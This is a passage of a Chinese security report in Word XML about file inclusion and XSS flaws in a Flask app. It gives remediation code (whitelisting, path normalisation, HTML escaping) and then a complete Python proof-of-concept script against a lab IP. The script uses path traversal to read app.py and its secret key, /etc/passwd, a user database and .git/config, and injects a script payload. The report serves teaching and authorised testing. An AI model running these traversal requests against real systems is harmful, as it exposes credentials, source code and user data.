        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. 修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复 1：修复 1：白名单页面名称</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>不使用文件路径拼接，改用白名单映射：</w:t>
        <w:br/>
        <w:br/>
        <w:t>PAGES = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "help": "help.html",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "about": "about.html",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "faq": "faq.html",</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = PAGES.get(name)  # 不在白名单中则返回 None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if filename is None:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return render_template("index.html", page_content="&lt;p&gt;页面不存在&lt;/p&gt;")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    with open(os.path.join("pages", filename), "r") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        content = f.read()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("index.html", page_content=content)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复 2：修复 2：路径规范化校验</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>使用 os.path.realpath 或 os.path.abspath 规范化路径，并确保最终路径在允许的目录范围内：</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    base_dir = os.path.realpath("pages")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    requested_path = os.path.realpath(os.path.join("pages", name))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 校验：请求路径必须在 base_dir 内</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not requested_path.startswith(base_dir):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return render_template("index.html", page_content="&lt;p&gt;页面不存在&lt;/p&gt;")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if os.path.exists(requested_path) and os.path.isfile(requested_path):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        with open(requested_path, "r") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            content = f.read()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        content = "&lt;p&gt;页面不存在&lt;/p&gt;"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("index.html", page_content=content)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复 3：修复 3：HTML 转义</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>移除 | safe 过滤器，或使用 bleach 库对 HTML 做严格的标签白名单过滤：</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复前（危险）</w:t>
        <w:br/>
        <w:t>{{ page_content | safe }}</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复后（安全）</w:t>
        <w:br/>
        <w:t>{{ page_content }}</w:t>
        <w:br/>
        <w:br/>
        <w:t># 或者使用 bleach 库做白名单过滤</w:t>
        <w:br/>
        <w:t>import bleach</w:t>
        <w:br/>
        <w:t>ALLOWED_TAGS = ["p", "b", "i", "u", "a", "h1", "h2", "h3", "ul", "ol", "li"]</w:t>
        <w:br/>
        <w:t>ALLOWED_ATTRS = {"a": ["href", "title"]}</w:t>
        <w:br/>
        <w:t>safe_html = bleach.clean(page_content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复 4：修复 4：文件上传与页面加载隔离</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>确保上传目录和页面加载目录完全隔离：</w:t>
        <w:br/>
        <w:br/>
        <w:t># uploads 目录的文件不能被 /page 访问</w:t>
        <w:br/>
        <w:t># pages 目录的文件不能被直接 HTTP 访问</w:t>
        <w:br/>
        <w:t># 使用不同的目录结构，并从代码层面限制路径范围</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复 5：修复 5：禁止自动补全后缀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>移除 .html 后缀自动补全机制，要求必须指定完整的文件名。</w:t>
        <w:br/>
        <w:t>如需补全，也应先校验后再拼接，而不是尝试 + 读取两步操作：</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复前：尝试读取 → 失败 → 加 .html 再试</w:t>
        <w:br/>
        <w:t># 修复后：先校验后缀，再读取</w:t>
        <w:br/>
        <w:t>if not name.endswith(".html"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "仅支持 .html 文件"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. POC 测试脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>以下是一个完整的 Python POC 脚本，可用于验证所有文件包含漏洞：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#!/usr/bin/env python3</w:t>
        <w:br/>
        <w:t>"""</w:t>
        <w:br/>
        <w:t>文件包含漏洞验证脚本</w:t>
        <w:br/>
        <w:t>使用: python3 poc_lfi.py</w:t>
        <w:br/>
        <w:t>"""</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:t>import re</w:t>
        <w:br/>
        <w:t>import os</w:t>
        <w:br/>
        <w:br/>
        <w:t>BASE_URL = "http://192.168.234.129:5000"</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_lfi_read_app_source():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试 LFI 读取应用源代码"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 1: 读取 app.py 源代码")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = requests.get(f"{BASE_URL}/page?name=../app.py")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "Flask" in r.text and "app.run" in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # 提取 Secret Key</w:t>
        <w:br/>
        <w:t xml:space="preserve">        sk_match = re.search(r'secret_key\s*=[^\n]+', r.text)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"  [漏洞确认] 成功读取 app.py 源码")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if sk_match:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            print(f"  [高危] 检测到 Secret Key 配置: {sk_match.group()}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("  [安全] 无法读取 app.py")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return False</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_lfi_read_passwd():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试 LFI 读取系统文件"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 2: 读取 /etc/passwd")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = requests.get(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        f"{BASE_URL}/page?name=../../../../etc/passwd"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    )</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "root:" in r.text and "nobody:" in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  [漏洞确认] 成功读取 /etc/passwd 系统用户列表")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        users = re.findall(r'^([^:]+):', r.text, re.MULTILINE)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"  发现系统用户: {', '.join(users[:10])}...")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("  [安全] 无法读取系统文件")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return False</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_lfi_read_database():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试 LFI 读取 SQLite 数据库"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 3: 读取 SQLite 数据库")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = requests.get(f"{BASE_URL}/page?name=../data/users.db")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if len(r.content) &gt; 100:  # SQLite 文件有固定格式</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"  [漏洞确认] 成功读取数据库文件 ({len(r.content)} 字节)")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("  [安全] 无法读取数据库")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return False</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_path_traversal_depth():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试路径遍历深度"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 4: 路径遍历深度探测")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for depth in range(1, 8):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        path = "../" * depth + "etc/passwd"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r = requests.get(f"{BASE_URL}/page?name={path}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if "root:" in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            print(f"  深度 {depth}: 成功读取 /etc/passwd")</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_xss_through_lfi():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试通过 LFI 触发的 XSS"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 5: LFI + XSS 组合攻击")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session = requests.Session()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 创建恶意 HTML 文件</w:t>
        <w:br/>
        <w:t xml:space="preserve">    os.makedirs("pages", exist_ok=True)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    payload = "&lt;script&gt;alert('XSS')&lt;/script&gt;"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    with open("pages/evil.html", "w") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        f.write(payload)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 通过 LFI 加载</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.get(f"{BASE_URL}/page?name=evil.html")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if payload in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  [漏洞确认] LFI 成功加载恶意 HTML，XSS 可触发")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"  注入内容: {payload}")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    os.remove("pages/evil.html")</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_lfi_read_git_config():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试读取 Git 配置"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 6: 读取 Git 仓库信息")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = requests.get(f"{BASE_URL}/page?name=../.git/config")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "repositoryformatversion" in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  [漏洞确认] 成功读取 Git 仓库配置")</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>if __name__ == "__main__":</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("=" * 50)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("文件包含漏洞验证脚本")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("目标:", BASE_URL)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("=" * 50)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    test_lfi_read_app_source()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    test_lfi_read_passwd()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    test_lfi_read_database()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    test_path_traversal_depth()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    test_xss_through_lfi()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    test_lfi_read_git_config()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("测试完成！若输出中包含"[漏洞确认]"，则系统存在文件包含漏洞。")</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
        </w:rPr>
        <w:t>— 报告结束 —</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>免责声明：本报告仅用于安全教学与测试。未经授权对他人系统进行文件包含攻击可能违反法律法规。请在获得授权的前提下进行安全测试。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